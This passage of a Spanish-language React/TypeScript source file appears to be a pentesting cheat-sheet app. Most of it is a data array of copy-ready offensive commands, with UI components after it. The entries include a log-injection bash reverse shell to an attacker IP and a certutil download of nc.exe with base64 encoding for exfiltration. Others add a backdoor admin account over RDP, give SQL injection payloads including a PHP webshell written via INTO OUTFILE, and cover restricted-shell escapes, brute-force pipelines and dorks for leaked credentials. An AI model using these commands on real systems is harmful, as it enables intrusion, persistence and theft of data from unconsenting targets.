    description: 'Enumeración básica del usuario actual. whoami /priv muestra privilegios como SeImpersonatePrivilege (Potato attacks), SeBackupPrivilege (leer archivos protegidos), SeLoadDriverPrivilege.',
    tags: ['windows', 'enum', 'privesc', 'privileges'],
    mitreId: 'T1033',
    notes: 'SeImpersonatePrivilege → JuicyPotato / PrintSpoofer. SeBackupPrivilege → leer SAM/NTDS.',
  },
  {
    id: 'win-certutil-transfer',
    tool: 'windows-builtins', phase: 'post_exploitation', category: 'File Transfer',
    title: 'certutil — transferencia de archivos',
    command: '# Descargar archivo desde HTTP:\ncertutil.exe -f -urlcache -split http://<tu-ip>/nc.exe C:\\Windows\\Temp\\nc.exe\n\n# Codificar archivo en base64 (para exfiltrar):\ncertutil.exe -encode C:\\ruta\\archivo.txt encoded.b64\n\n# Decodificar:\ncertutil.exe -decode encoded.b64 output.txt',
    description: 'certutil es un binario legítimo de Windows (LOLBAS) usado para transferir archivos sin herramientas adicionales. Muy útil cuando no se puede usar PowerShell o wget. También permite codificar/decodificar base64.',
    tags: ['windows', 'file-transfer', 'lolbas', 'certutil'],
    mitreId: 'T1105',
    notes: 'LOLBAS = Living Off the Land Binaries and Scripts. certutil puede evadir controles que bloquean powershell -c "DownloadFile".',
  },
  {
    id: 'win-rdp-enable',
    tool: 'windows-builtins', phase: 'post_exploitation', category: 'Persistencia',
    title: 'Habilitar RDP y firewall desde cmd/PS',
    command: '# Habilitar RDP:\nreg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f\n\n# Abrir puerto en firewall:\nnetsh advfirewall firewall add rule name="RDP" protocol=TCP dir=in localport=3389 action=allow\n\n# Crear usuario y agregar a Remote Desktop Users:\nnet user pentester Password123! /add\nnet localgroup "Remote Desktop Users" pentester /add\nnet localgroup "Administrators" pentester /add\n\n# Conectar desde Linux:\nxfreerdp /v:<target> /u:pentester /p:Password123! /cert:ignore',
    description: 'Habilitar acceso RDP persistente en un Windows comprometido. Útil cuando se tiene ejecución de comandos (xp_cmdshell, rev shell) pero se quiere una sesión gráfica interactiva.',
    tags: ['rdp', 'persistence', 'windows', 'lateral-movement'],
    mitreId: 'T1021',
    notes: 'Puerto RDP: 3389 (ms-wbt-server). xfreerdp para conectar desde Linux.',
  },
  {
    id: 'win-net-commands',
    tool: 'windows-builtins', phase: 'post_exploitation', category: 'Enumeración Local',
    title: 'net — enumerar usuarios, grupos y shares',
    command: 'net user                          # Listar usuarios locales\nnet user <username>               # Detalle de un usuario\nnet localgroup                    # Listar grupos locales\nnet localgroup Administrators     # Miembros del grupo\nnet share                         # Shares activos\nnet view \\\\<target>              # Shares de otro host\nnet accounts                      # Política de contraseñas',
    description: 'Comandos net para enumeración rápida en sistemas Windows sin necesitar herramientas externas. Disponible en cualquier Windows desde Windows NT.',
    tags: ['windows', 'enum', 'users', 'shares', 'lolbas'],
    mitreId: 'T1087',
  },
  {
    id: 'win-python-shell-upgrade',
    tool: 'windows-builtins', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Shell upgrade — PTY interactiva',
    command: '# Linux — Python (el más confiable):\npython3 -c "import pty;pty.spawn(\'/bin/bash\')"\npython -c "import pty;pty.spawn(\'/bin/bash\')"\n\n# Luego para tty completa:\n# Ctrl+Z (background)\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 40 columns 180\n\n# Alternativa con script:\nscript /dev/null -c bash\n\n# Listener mejorado con rlwrap (historial, flechas):\nrlwrap nc -nlvp 443',
    description: 'Mejorar una reverse shell básica a una TTY interactiva completa. Permite usar Ctrl+C sin matar la sesión, historial de comandos, autocompletado y editores como vim/nano.',
    tags: ['shell', 'pty', 'linux', 'tty', 'upgrade'],
    mitreId: 'T1059',
    notes: 'rlwrap nc da historial de comandos incluso sin upgradear la shell. Instalar: apt install rlwrap',
  },

  // ── BASH SCRIPTS — Reconocimiento propio ─────────────────────────────────
  {
    id: 'bash-ping-sweep',
    tool: 'bash-scripts', phase: 'recon', category: 'Host Discovery',
    title: 'Ping sweep — descubrir hosts activos',
    command: '#!/bin/bash\n# Uso: bash ipscan.sh\nfor i in $(seq 1 255); do\n  timeout 1 bash -c "ping -c 1 10.10.10.$i" > /dev/null && echo "10.10.10.$i - Activo" &\ndone; wait',
    description: 'Script bash para descubrir hosts activos en una /24 usando ICMP. Lanza todos los pings en paralelo con & y espera resultados. Alternativa liviana a nmap -sn cuando no se tiene nmap.',
    tags: ['bash', 'ping', 'host-discovery', 'recon', 'icmp'],
    mitreId: 'T1595',
    notes: 'Modificar 10.10.10 con el segmento de red a escanear. Requiere conectividad ICMP al target.',
  },
  {
    id: 'bash-port-scan',
    tool: 'bash-scripts', phase: 'recon', category: 'Port Scanning',
    title: 'Port scanner — sin nmap',
    command: '#!/bin/bash\n# Uso: bash portscan.sh <ip>\ntrap ctrl_c INT\nfunction ctrl_c() { echo -e "\\n[*] Saliendo...\\n"; tput cnorm; exit 0; }\n\ntput civis\nfor port in $(seq 1 65535); do\n  timeout 1 bash -c "echo > /dev/tcp/$1/$port" 2>/dev/null && echo "Puerto $port - ABIERTO" &\ndone; wait\ntput cnorm',
    description: 'Port scanner puro en bash usando /dev/tcp. Útil en entornos donde nmap no está disponible (contenedores, sistemas embebidos, CTF con restricciones). Más lento que nmap pero no requiere herramientas externas.',
    tags: ['bash', 'port-scan', 'recon', 'no-tools'],
    mitreId: 'T1595',
    notes: '/dev/tcp es una feature de bash — no funciona en sh o dash. Pasar la IP como argumento: bash portscan.sh 10.10.10.5',
  },
  {
    id: 'bash-os-ttl',
    tool: 'bash-scripts', phase: 'recon', category: 'OS Detection',
    title: 'OS detection por TTL (ping)',
    command: '# Método rápido — leer TTL del ping:\nping -c 1 <target> | grep ttl\n# TTL ~64  → Linux/Unix\n# TTL ~128 → Windows\n# TTL ~254 → Cisco/Solaris\n\n# Script Python — detección automática:\n#!/usr/bin/env python3\nimport subprocess, re, sys\ndef get_os(ip):\n    out = subprocess.check_output(["ping","-c","1",ip]).decode()\n    ttl = int(re.search(r"ttl=(\\d+)", out).group(1))\n    if ttl <= 64: return "Linux/Unix"\n    elif ttl <= 128: return "Windows"\n    else: return "Cisco/Solaris"\nprint(get_os(sys.argv[1]))',
    description: 'Identificar el sistema operativo de forma no invasiva analizando el TTL en la respuesta ICMP. Linux usa TTL 64, Windows 128, Cisco/Solaris 254. Los valores reales son menores por los saltos de red.',
    tags: ['os-detection', 'ttl', 'ping', 'icmp', 'recon', 'passive'],
    mitreId: 'T1592',
    notes: 'El TTL decrece 1 por cada router. Un valor de 127 probablemente es Windows (128 - 1 salto).',
  },
  {
    id: 'bash-log-injection',
    tool: 'bash-scripts', phase: 'exploitation', category: 'Injection Techniques',
    title: 'Log injection — reverse shell via archivo de log',
    command: '# Si un script externo lee un log y ejecuta su contenido:\n# 1. Dejar listener en escucha:\nnc -nlvp 4444\n\n# 2. Inyectar reverse shell en el log (el espacio al inicio es intencional):\necho "  ;/bin/bash -c \'bash -i >& /dev/tcp/<tu-ip>/4444 0>&1\' #" >> /ruta/del/logfile\n\n# El script externo al procesar la línea ejecutará el comando inyectado',
    description: 'Técnica de inyección cuando un proceso externo (cron job, script de monitoreo) lee un archivo que podemos escribir y ejecuta su contenido. El punto y coma separa comandos, el # comenta el resto de la línea para evitar errores.',
    tags: ['injection', 'log-injection', 'linux', 'privesc', 'lateral-movement'],
    mitreId: 'T1574',
    notes: 'Verificar si el script tiene SUID o si corre como root/otro usuario. Revisar con: sudo -l, crontab -l, /etc/cron.*',
  },

  // ── GOOGLE DORKS ──────────────────────────────────────────────────────────────
  {
    id: 'dork-credentials-pastebin',
    tool: 'google-dorks', phase: 'recon', category: 'OSINT',
    title: 'Buscar credenciales filtradas en Pastebin',
    command: '"target.com" "password" site:pastebin.com\n"@target.com" "pass" site:pastebin.com\n"netflix" "email" site:pastebin.com',
    description: 'Busca credenciales, emails y contraseñas de una organización publicadas en Pastebin u otros paste sites. Muy útil en la fase de reconocimiento pasivo antes de un engagement.',
    tags: ['dork', 'google', 'pastebin', 'credentials', 'osint', 'recon'],
    mitreId: 'T1593',
  },
  {
    id: 'dork-exposed-databases',
    tool: 'google-dorks', phase: 'recon', category: 'OSINT',
    title: 'Buscar bases de datos expuestas y dumps SQL',
    command: 'ext:sql intext:"@gmail.com" intext:"password"\next:sql intext:"@gmail.com" intext:"password" -github.com\next:sql intext:"CREATE TABLE" intext:"INSERT INTO" site:target.com',
    description: 'Encuentra dumps de bases de datos indexados por Google. El flag -github.com excluye repositorios públicos para reducir ruido. Útil para encontrar datos filtrados de un objetivo.',
    tags: ['dork', 'google', 'sql', 'database', 'osint'],
    mitreId: 'T1593',
  },
  {
    id: 'dork-login-panels',
    tool: 'google-dorks', phase: 'recon', category: 'Fingerprinting',
    title: 'Encontrar paneles de login y admin',
    command: 'site:target.com inurl:login\nsite:target.com inurl:admin\nsite:target.com intitle:"login" OR intitle:"sign in"\nsite:target.com filetype:php inurl:admin\ninurl:"/wp-admin" site:target.com',
    description: 'Descubre paneles de administración, login y rutas sensibles indexadas por Google. Permite mapear la superficie de ataque sin interactuar directamente con el servidor.',
    tags: ['dork', 'google', 'login', 'admin', 'recon', 'surface'],
    mitreId: 'T1593',
  },
  {
    id: 'dork-robots-config',
    tool: 'google-dorks', phase: 'recon', category: 'Fingerprinting',
    title: 'robots.txt, configs y archivos sensibles',
    command: '# Ver robots.txt de un sitio (manual):\nhttps://target.com/robots.txt\n\n# Dorks para archivos sensibles:\nsite:target.com filetype:env\nsite:target.com filetype:conf\nsite:target.com filetype:bak\nsite:target.com ext:log\nsite:target.com "Index of /"',
    description: 'robots.txt revela directorios que el dueño no quiere que Google indexe — exactamente lo que nos interesa. También buscar archivos de configuración, backups y logs indexados por error.',
    tags: ['dork', 'google', 'robots.txt', 'config', 'sensitive-files', 'recon'],
    mitreId: 'T1593',
    notes: 'Index of / indica directory listing habilitado — posible acceso directo a archivos del servidor.',
  },
  {
    id: 'dork-shodan',
    tool: 'google-dorks', phase: 'recon', category: 'OSINT',
    title: 'Shodan dorks — dispositivos y servicios expuestos',
    command: '# Buscar por país y puerto:\ncountry:"AR" port:22\n\n# Servicios específicos:\nport:554 Hipcam country:AR\nproftpd port:21\n"authentication disabled" port:5900\n\n# Por red u organización:\norg:"Telecom Argentina"\nnet:200.49.0.0/16\n\n# Desde CLI:\nshodan search "apache" --limit 100\nshodan host <ip>',
    description: 'Shodan indexa dispositivos conectados a internet. Sus dorks permiten filtrar por país, puerto, producto, organización y rango de IP. Útil para footprinting de redes de un cliente antes del engagement.',
    tags: ['shodan', 'dork', 'recon', 'osint', 'iot', 'network'],
    mitreId: 'T1596',
    notes: 'API key gratuita en https://account.shodan.io. CLI: pip install shodan && shodan init <API_KEY>',
  },
  {
    id: 'dork-bing-ip',
    tool: 'google-dorks', phase: 'recon', category: 'OSINT',
    title: 'Bing — Reverse IP lookup (dominio por IP)',
    command: '# Bing soporta búsqueda por IP (Google no):\nip:1.2.3.4\n\n# Encontrar todos los dominios en el mismo servidor:\nip:200.49.190.30\n\n# Combinado con site:\nip:200.49.190.30 site:target.com\n\n# Alternativa online:\n# https://viewdns.info/reverseip/',
    description: 'Bing permite búsqueda por IP con el operador ip: — Google no lo soporta. Fundamental para encontrar todos los dominios alojados en el mismo servidor. Un sitio vulnerable puede dar acceso lateral a otros en el mismo host.',
    tags: ['bing', 'dork', 'reverse-ip', 'osint', 'recon'],
    mitreId: 'T1590',
  },

  // ── OSRFRAMEWORK — OSINT especializado ────────────────────────────────────────
  {
    id: 'osrf-user-search',
    tool: 'osrframework', phase: 'recon', category: 'OSINT',
    title: 'usufy — buscar username en múltiples plataformas',
    command: '# Buscar un username en todas las plataformas:\nusufy -n targetuser -p all\n\n# En plataformas específicas:\nusufy -n targetuser -p twitter,instagram,github,reddit\n\n# Alternativa moderna (Sherlock):\npython3 sherlock targetuser\npython3 sherlock targetuser --site twitter --site github',
    description: 'OSRFramework.usufy busca un nombre de usuario en cientos de plataformas sociales. Permite construir el perfil digital de un objetivo. Sherlock es la alternativa más activa.',
    tags: ['osrf', 'osint', 'username', 'social-media', 'sherlock'],
    mitreId: 'T1589',
    notes: 'Sherlock: pip install sherlock-project / git clone https://github.com/sherlock-project/sherlock',
  },
  {
    id: 'osrf-email-domain',
    tool: 'osrframework', phase: 'recon', category: 'OSINT',
    title: 'mailfy / searchfy / phonefy — email, nombre y teléfono',
    command: '# Buscar cuentas asociadas a un email:\nmailfy -m target@gmail.com\n\n# Buscar por nombre completo:\nsearchfy -p all -q "Nombre Apellido"\n\n# Verificar un número (spam, identidad):\nphonefy -n +5491112345678\n\n# Análisis de entidad (URL):\nentify -r all -w https://target.com\n\n# Enumerar dominios relacionados:\ndomainfy -n targetcompany',
    description: 'Herramientas de OSRFramework para correlacionar información: un email puede llevar a username, que lleva a más cuentas. La ingeniería inversa de cada dato descubierto amplía el perfil del objetivo.',
    tags: ['osrf', 'osint', 'email', 'phone', 'domain', 'recon'],
    mitreId: 'T1589',
    notes: 'Instalar: pip3 install osrframework. Al encontrar un email con mailfy, buscar ese username con usufy.',
  },

  // ── CRUNCH — Generación de wordlists ─────────────────────────────────────────
  {
    id: 'crunch-basic',
    tool: 'crunch', phase: 'general', category: 'Password Cracking',
    title: 'Crunch — sintaxis básica y clases de caracteres',
    command: '# Sintaxis: crunch <min> <max> [charset] [opciones]\n# Clases de caracteres con -t:\n#   @ = minúsculas (a-z)\n#   , = mayúsculas (A-Z)\n#   % = números (0-9)\n#   ^ = símbolos (!@#$...)\n\n# Generar contraseñas de exactamente 8 chars: kill0r + número + minúscula:\ncrunch 8 8 -t kill0r%@ -o wordlist.txt\n\n# Contraseñas de 6 chars con letras abc y números 123:\ncrunch 6 6 abc123 -t @@@@c@ -o out.txt\n\n# Todas las combinaciones 4-8 chars alfanuméricas:\ncrunch 4 8 qwertyuiopasdfghjklzxcvbnm0123456789 -o big.txt',
    description: 'Crunch genera wordlists personalizadas con patrones específicos. Los operadores de patrón (-t) permiten fijar partes conocidas de la contraseña y generar variaciones en posiciones específicas.',
    tags: ['crunch', 'wordlist', 'brute-force', 'password', 'generate'],
    mitreId: 'T1110',
    notes: 'Para WPA/WPA2 con aircrack-ng: crunch 8 12 | aircrack-ng handshake.cap -w -',
  },
  {
    id: 'crunch-piped-attacks',
    tool: 'crunch', phase: 'general', category: 'Password Cracking',
    title: 'Crunch piped — sin disco, pausable',
    command: '# Ataque WPA directo sin guardar en disco:\ncrunch 8 8 abc123 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Con John para guardar sesión y reanudar:\ncrunch 8 8 | john --stdin --session=mysession --stdout | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Reanudar sesión pausada:\ncrunch 8 8 | john --restore=mysession | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Con hydra (SSH):\ncrunch 6 6 abc123 | hydra -l admin -P - 192.168.1.1 ssh',
    description: 'Pasar crunch directamente a la herramienta de ataque via pipe evita escribir en disco (más rápido, sin espacio). John actúa como intermediario para poder pausar/reanudar el ataque.',
    tags: ['crunch', 'pipe', 'wordlist', 'aircrack', 'hydra', 'john'],
    mitreId: 'T1110',
  },

  // ── MANUAL SQLi — Quick Reference ─────────────────────────────────────────────
  {
    id: 'sqli-bypass-auth',
    tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
    title: 'Bypass de autenticación — payloads clásicos',
    command: "# En campo usuario (el password puede ser cualquier cosa):\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' #\nadmin'--\nadmin'#\n\n# Con campo específico conocido:\n' OR (1=1 AND username='admin') --\n\n# Variantes para MySQL:\n' OR 1=1 LIMIT 1 --\n' OR 1=1 LIMIT 1 #\n\n# Para testear si hay inyección:\n'\n''\n`\n\"\"",
    description: 'Payloads para bypass de login sin sqlmap. El -- y # comentan el resto de la query SQL. Probar primero los más simples y aumentar complejidad. Si el sitio muestra error de SQL al ingresar una comilla simple, confirma inyección.',
    tags: ['sqli', 'manual', 'bypass', 'auth', 'login', 'web'],
    mitreId: 'T1190',
    notes: 'Guía completa: https://gist.github.com/m0k1/ada77aacefe3dcae7bc2',
  },
  {
    id: 'sqli-union-recon',
    tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
    title: 'UNION-based — enumerar columnas y bases de datos',
    command: "# Primero determinar número de columnas:\n' ORDER BY 1--\n' ORDER BY 2--  (incrementar hasta dar error)\n\n# Luego UNION SELECT con NULLs:\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n\n# Identificar columna de texto:\n' UNION SELECT 'a',NULL,NULL--\n' UNION SELECT NULL,'a',NULL--\n\n# Extraer versión y base de datos actual:\n' UNION SELECT @@version,NULL,NULL--\n' UNION SELECT database(),NULL,NULL--\n' UNION SELECT user(),NULL,NULL--\n\n# Listar tablas:\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
    description: 'Inyección UNION permite extraer datos de otras tablas. Primero encontrar el número de columnas con ORDER BY, luego usar UNION SELECT con la misma cantidad de columnas. Compatible con MySQL, PostgreSQL, SQLite.',
    tags: ['sqli', 'union', 'manual', 'mysql', 'postgresql', 'web'],
    mitreId: 'T1190',
  },
  {
    id: 'sqli-lfi-via-load',
    tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
    title: 'SQLi avanzado — LOAD_FILE y INTO OUTFILE',
    command: "# Leer archivo del servidor (requiere permisos FILE):\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--\n\n# Escribir webshell al servidor:\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\n\n# Verificar si tenemos permisos:\n' UNION SELECT super_priv FROM mysql.user WHERE user=user()--",
    description: 'Si MySQL tiene FILE privilege habilitado, LOAD_FILE permite leer archivos del servidor y INTO OUTFILE escribir. Puede llevar a RCE al escribir una webshell. Requiere conocer la ruta del webroot.',
    tags: ['sqli', 'mysql', 'file-read', 'webshell', 'rce', 'web'],
    mitreId: 'T1190',
    notes: 'Verificar que secure_file_priv no restrinja la ruta: SHOW VARIABLES LIKE "secure_file_priv"',
  },

  // ── RESTRICTED SHELL ESCAPE ────────────────────────────────────────────────────
  {
    id: 'rbash-escape-vi',
    tool: 'restricted-shell', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Escape via vi / vim',
    command: '# Abrir vi desde la shell restringida:\nvi\n\n# Dentro de vi ejecutar bash:\n:!/bin/bash\n:set shell=/bin/bash\n:shell\n\n# Alternativa con man:\nman ls  # dentro del man:\n!/bin/bash\n\n# Con less o more:\nless /etc/passwd  # dentro:\n!/bin/bash\n\n# Escape via nmap (versiones antiguas):\nnmap --interactive\n!sh',
    description: 'Vi/vim permite ejecutar comandos del sistema con :!. Si vi está disponible en una shell restringida (rbash), se puede escapar a bash completo. man, less, y more también tienen funciones de ejecución de comandos.',
    tags: ['restricted-shell', 'rbash', 'escape', 'vi', 'vim', 'privesc'],
    mitreId: 'T1059',
    notes: 'Referencia: https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/',
  },
  {
    id: 'rbash-escape-path',
    tool: 'restricted-shell', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Escape via manipulación de PATH',
    command: '# Ver el PATH actual y binarios disponibles:\necho $PATH\necho $SHELL\n\n# Si PATH está restringido, sobreescribirlo:\nexport PATH=/bin:$PATH\nexport PATH=/usr/bin:$PATH\nexport PATH=/usr/local/bin:$PATH\n\n# Ejecutar directamente con ruta absoluta:\n/bin/bash\n/usr/bin/python3 -c "import os; os.system(\'/bin/bash\')"\n\n# Si el shell en /etc/passwd es rbash, probar al conectar:\nssh user@target -t "bash --noprofile"\nssh user@target -t "/bin/bash"',
    description: 'rbash (restricted bash) limita el PATH y bloquea comandos con /. Sobrescribir la variable PATH o especificar rutas absolutas puede evadir las restricciones. También se puede escapar al conectar por SSH.',
    tags: ['restricted-shell', 'rbash', 'escape', 'path', 'privesc', 'ssh'],
    mitreId: 'T1059',
  },
  {
    id: 'rbash-escape-python',
    tool: 'restricted-shell', phase: 'post_exploitation', category: 'Shell Upgrade',
    title: 'Escape via Python / scripting languages',
    command: '# Python 3:\npython3 -c "import os; os.system(\'/bin/bash\')"\npython3 -c "import subprocess; subprocess.call([\'/bin/bash\'])"\n\n# Python 2:\npython -c "import pty; pty.spawn(\'/bin/bash\')"\n\n# Perl:\nperl -e "exec \'/bin/bash\'"\n\n# Ruby:\nruby -e "exec \'/bin/bash\'"\n\n# AWK:\nawk \'BEGIN {system(\"/bin/bash\")}\'  \n\n# Lua:\nlua -e "os.execute(\'/bin/bash\')"\n\n# PHP:\nphp -r "system(\'/bin/bash\');"\n\n# Node.js:\nnode -e "require(\'child_process\').spawn(\'/bin/bash\', {stdio: [0, 1, 2]})"',
    description: 'Si hay lenguajes de scripting disponibles (Python, Perl, Ruby, etc.) se pueden usar para escapar a una shell sin restricciones. Verificar disponibilidad con which python3 / which perl / etc.',
    tags: ['restricted-shell', 'escape', 'python', 'perl', 'ruby', 'awk', 'privesc'],
    mitreId: 'T1059',
  },
]

// ─── Helpers ──────────────────────────────────────────────────────────────────
function toolCount(tool: string) {
  return COMANDOS.filter(c => c.tool === tool).length
}

const KALI_BADGE: Record<string, { label: string; cls: string }> = {
  yes:     { label: '✓ Kali', cls: 'text-green-500' },
  partial: { label: '⚠ Kali', cls: 'text-yellow-500' },
  no:      { label: '✗ Kali', cls: 'text-zinc-600' },
}

// ─── Copy to clipboard ───────────────────────────────────────────────────────
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)
  const copy = () => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }
  return (
    <button
      onClick={copy}
      className='absolute right-2 top-2 rounded p-1 text-zinc-500 opacity-0 transition hover:text-zinc-200 group-hover:opacity-100'
      title='Copiar'
    >
      {copied ? <Check className='h-3.5 w-3.5 text-green-400' /> : <Copy className='h-3.5 w-3.5' />}
    </button>
  )
}

// ─── Comando Card ─────────────────────────────────────────────────────────────
interface ComandoCardProps {
  cmd: Comando
  isCustom?: boolean
  isModified?: boolean
  onEdit?: () => void
  onDelete?: () => void
}
function ComandoCard({ cmd, isCustom, isModified, onEdit, onDelete }: ComandoCardProps) {
  return (
    <div className={cn('rounded-lg border bg-zinc-900/50 p-4', isCustom ? 'border-red-900/40' : 'border-zinc-800')}>
      <div className='mb-2 flex items-start justify-between gap-2'>
        <div className='flex items-center gap-1.5 min-w-0'>
          {isCustom && (
            <span className='shrink-0 text-[9px] font-bold text-red-500 bg-red-500/10 border border-red-500/20 px-1 py-0.5 rounded'>CUSTOM</span>
          )}
          {isModified && (
            <span className='shrink-0 text-[9px] font-bold text-yellow-600 bg-yellow-600/10 border border-yellow-600/20 px-1 py-0.5 rounded'>EDIT</span>
          )}
          <h3 className='font-medium text-sm text-zinc-200 truncate'>{cmd.title}</h3>
        </div>
        <div className='flex items-center gap-1 shrink-0'>
          {onEdit && (
            <button onClick={onEdit} className='p-1 rounded text-zinc-600 hover:text-zinc-300 hover:bg-zinc-800 transition'>
              <Pencil className='h-3 w-3' />
            </button>
          )}
          {onDelete && (
            <button onClick={onDelete} className='p-1 rounded text-zinc-600 hover:text-red-400 hover:bg-red-900/20 transition'>
              <Trash2 className='h-3 w-3' />
            </button>
          )}
          <Badge variant='outline' className={cn('text-[10px] px-1.5 py-0', PHASE_COLORS[cmd.phase])}>
            {PHASE_LABELS[cmd.phase]}
          </Badge>
        </div>
      </div>

      {cmd.description && <p className='mb-3 text-xs text-zinc-400 leading-relaxed'>{cmd.description}</p>}

      <div className='group relative'>
        <pre className='overflow-x-auto rounded-md bg-zinc-950 px-3 py-2.5 text-xs font-mono text-zinc-300 leading-relaxed whitespace-pre-wrap break-all'>
          {cmd.command}
        </pre>
        <CopyButton text={cmd.command} />
      </div>

      {cmd.notes && (
        <p className='mt-2 text-[11px] text-zinc-500 italic'>💡 {cmd.notes}</p>
      )}

      <div className='mt-3 flex flex-wrap items-center gap-1.5'>
        {cmd.tags.map(t => (
          <span key={t} className='rounded bg-zinc-800 px-1.5 py-0.5 text-[10px] text-zinc-500'>{t}</span>
        ))}
        {cmd.mitreId && (
          <Link to='/tecnicas' search={{ mitre: cmd.mitreId }}
            className='ml-auto flex items-center gap-1 text-[10px] text-zinc-600 hover:text-red-400 transition-colors'>
            <ExternalLink className='h-2.5 w-2.5' />{cmd.mitreId}
          </Link>
        )}
      </div>
    </div>
  )
}

// ─── Custom types (from DB) ───────────────────────────────────────────────────
interface CustomTool {
  id: string
  key_name: string
  label: string
  description: string | null
  arsenal_cat: string
  kali: 'yes' | 'partial' | 'no'
}

interface CustomCmd {
  id: string
  tool_key: string
  phase: Phase
  category: string
  title: string
  command: string
  description: string | null
  tags: string[]
  notes: string | null
  mitre_id: string | null
  author_name: string | null
}

// ─── Props ────────────────────────────────────────────────────────────────────
interface ComandosProps {
  initialTool?: string
}

// ─── Add/Edit Command Form ────────────────────────────────────────────────────
interface CmdFormInitial {
  title?: string
  command?: string
  description?: string | null
  phase?: Phase
  category?: string
  notes?: string | null
  mitreId?: string | null
  tags?: string[]
}
interface CmdFormProps {
  toolKey: string
  allToolMeta: Record<string, ToolMeta>
  initial?: CmdFormInitial
  onSave: (data: Partial<CustomCmd>) => Promise<void>
  onCancel: () => void
  saving: boolean
}
function CmdForm({ toolKey, allToolMeta, initial, onSave, onCancel, saving }: CmdFormProps) {
  const [title, setTitle]         = useState(initial?.title ?? '')
  const [command, setCommand]     = useState(initial?.command ?? '')
  const [description, setDesc]    = useState(initial?.description ?? '')
  const [phase, setPhase]         = useState<Phase>(initial?.phase ?? 'general')
  const [category, setCategory]   = useState(initial?.category ?? 'General')
  const [notes, setNotes]         = useState(initial?.notes ?? '')
  const [mitreId, setMitreId]     = useState(initial?.mitreId ?? '')
  const [tags, setTags]           = useState((initial?.tags ?? []).join(', '))

  const submit = () => onSave({
    tool_key: toolKey,
    title: title.trim(),
    command: command.trim(),
    description: description.trim() || undefined,
    phase, category: category.trim() || 'General',
    notes: notes.trim() || undefined,
    mitre_id: mitreId.trim() || undefined,
    tags: tags.split(',').map(t => t.trim()).filter(Boolean),
  })

  return (
    <div className='space-y-3 p-4 rounded-lg border border-zinc-700 bg-zinc-900/80'>
      <div className='flex items-center justify-between'>
        <span className='text-xs font-semibold text-zinc-300'>{initial ? 'Editar comando' : 'Nuevo comando'}</span>
        <button onClick={onCancel} className='text-zinc-500 hover:text-zinc-300'><X className='h-4 w-4' /></button>
      </div>
      <div className='grid grid-cols-2 gap-2'>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Título *</label>
          <Input value={title} onChange={e => setTitle(e.target.value)} placeholder='Ej: Enumerar shares' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Fase</label>
          <select value={phase} onChange={e => setPhase(e.target.value as Phase)}
            className='h-7 w-full rounded-md border border-zinc-700 bg-zinc-950 px-2 text-xs text-zinc-200'>
            {(Object.keys(PHASE_LABELS) as Phase[]).map(p => <option key={p} value={p}>{PHASE_LABELS[p]}</option>)}
          </select>
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Categoría</label>
          <Input value={category} onChange={e => setCategory(e.target.value)} placeholder='Ej: Brute Force' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Comando *</label>
          <Textarea value={command} onChange={e => setCommand(e.target.value)} rows={4}
            placeholder='El comando o serie de comandos...' className='text-xs font-mono bg-zinc-950 border-zinc-700 resize-none' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Descripción</label>
          <Textarea value={description} onChange={e => setDesc(e.target.value)} rows={2}
            placeholder='Qué hace este comando...' className='text-xs bg-zinc-950 border-zinc-700 resize-none' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>MITRE ID</label>
          <Input value={mitreId} onChange={e => setMitreId(e.target.value)} placeholder='T1234' className='h-7 text-xs font-mono bg-zinc-950 border-zinc-700' />
        </div>
        <div className='space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Tags (comas)</label>
          <Input value={tags} onChange={e => setTags(e.target.value)} placeholder='smb, enum, ad' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
        <div className='col-span-2 space-y-1'>
          <label className='text-[10px] text-zinc-500 uppercase'>Notas</label>
          <Input value={notes} onChange={e => setNotes(e.target.value)} placeholder='Tip o aclaración...' className='h-7 text-xs bg-zinc-950 border-zinc-700' />
        </div>
      </div>
      <div className='flex gap-2 justify-end'>
        <Button size='sm' variant='ghost' onClick={onCancel} className='h-7 text-xs'>Cancelar</Button>
        <Button size='sm' onClick={submit} disabled={saving || !title.trim() || !command.trim()} className='h-7 text-xs'>
          {saving ? 'Guardando...' : initial ? 'Guardar cambios' : 'Agregar comando'}
        </Button>
      </div>
    </div>
  )
}

// ─── Add Tool Form ────────────────────────────────────────────────────────────
interface ToolFormProps {
  defaultCat: string
  onSave: (data: Omit<CustomTool, 'id'>) => Promise<void>
  onCancel: () => void
  saving: boolean
}
function ToolForm({ defaultCat, onSave, onCancel, saving }: ToolFormProps) {
  const [label, setLabel]       = useState('')
  const [keyName, setKeyName]   = useState('')
